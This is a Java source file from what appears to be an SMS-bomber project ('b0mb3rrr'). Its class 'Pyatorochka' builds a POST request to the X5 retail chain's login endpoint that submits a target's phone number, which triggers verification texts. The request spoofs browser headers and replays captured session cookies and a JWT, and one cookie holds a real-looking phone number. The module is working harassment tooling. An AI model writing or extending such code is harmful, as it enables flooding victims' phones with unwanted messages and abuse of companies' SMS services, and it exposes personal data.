package me.oneqxz.b0mb3rrr.services.impl;

import me.oneqxz.b0mb3rrr.data.Phone;
import me.oneqxz.b0mb3rrr.services.Service;
import okhttp3.FormBody;
import okhttp3.Request;
import okhttp3.RequestBody;

public class Pyatorochka extends Service {
    @Override
    public Request.Builder buildRequest(Phone phone) {
        RequestBody formBody = new FormBody.Builder()
                .add("username", phone.format("***********"))
                .add("rememberMe", "on")
                .build();

        return new Request.Builder()
                .url("https://id.x5.ru/auth/realms/ssox5id/login-actions/authenticate?session_code=vTKq-RGsEQAeY7506euT8vt_KgliW7-a2_wl2D3ro5Y&execution=13d514a4-c499-4c8d-95c5-7846ab50457c&client_id=tc5_web&tab_id=dyOQE0pTZfE")
                .post(formBody)
                .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                .header("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
                .header("Accept-Encoding", "gzip, deflate, br")
                .header("Content-Type", "application/x-www-form-urlencoded")
                .header("Origin", "null")
                .header("Connection", "keep-alive")
                .header("Cookie", "AUTH_SESSION_ID=c34d4743-5fba-4396-9809-943d014d9bad.kk-594f99d894-xg6hj; AUTH_SESSION_ID_LEGACY=c34d4743-5fba-4396-9809-943d014d9bad.kk-594f99d894-xg6hj; KC_RESTART=eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI2MmE2YTcwYS0wOGNkLTQwMTktOGFiYy0zYjg4ZjVkODYzNzAifQ.eyJjaWQiOiJ0YzVfd2ViIiwicHR5Ijoib3BlbmlkLWNvbm5lY3QiLCJydXJpIjoiaHR0cHM6Ly81a2EucnUvbXkiLCJhY3QiOiJBVVRIRU5USUNBVEUiLCJub3RlcyI6eyJzY29wZSI6Im9wZW5pZCBvZmZsaW5lX2FjY2VzcyIsImlzcyI6Imh0dHBzOi8vaWQueDUucnUvYXV0aC9yZWFsbXMvc3NveDVpZCIsInJlc3BvbnNlX3R5cGUiOiJjb2RlIiwicmVkaXJlY3RfdXJpIjoiaHR0cHM6Ly81a2EucnUvbXkiLCJzdGF0ZSI6ImkzU2VlQjNodHR2RCIsIm5vbmNlIjoienltaXluaHl5TDA2IiwicmVzcG9uc2VfbW9kZSI6InF1ZXJ5In19.wxc8LRceJCpBR1QDiT9L03seMhCbtwwA-lsokBc-52s; TS011f02d7=01a93f75473a42a9b0f2796981a8859fb13b5e42ca93c022e9a9b630e72395261acbe439e5baa68676fc14a946124c380436ee3447c338ff36e8e9a49d65095cbd3b25fab4d688aa3de15fd5383f2977e0bbaa6235c72da8307ff9d75abebaba64f0fd50df; NSC_y5je_l8t_31443_IUUQT_wt=ffffffffc3a0f00d45525d5f4f58455e445a4a424ce3; TS01f13338=01a93f75479c11196c28d8f18fd44c004c5764030593c022e9a9b630e72395261acbe439e5e5d76ecc5853594e901d79902cf24662a130dbd86beefa77182b610da9a54fa1; ADRUM_X5ID_ID=ef6f7014-0e8a-4af6-af03-b0bb89372342; ym_enable=true; x5_3pc=fdb562e7-1d6a-78f3-0ece-7a6a15ec4a47; _ym_uid=1712874580218869983; _ym_d=1712874580; _ym_isad=2; mindboxDeviceUUID=6ac0785d-9923-48be-b26a-53bcae92c577; directCrm-session=%7B%22deviceGuid%22%3A%226ac0785d-9923-48be-b26a-53bcae92c577%22%7D; loginHint=79535280533")
                .header("Upgrade-Insecure-Requests", "1")
                .header("Sec-Fetch-Dest", "document")
                .header("Sec-Fetch-Mode", "navigate")
                .header("Sec-Fetch-Site", "same-origin")
                .header("Sec-Fetch-User", "?1");
    }

    @Override
    public String getServiceName() {
        return "Pyatorochka";
    }
}
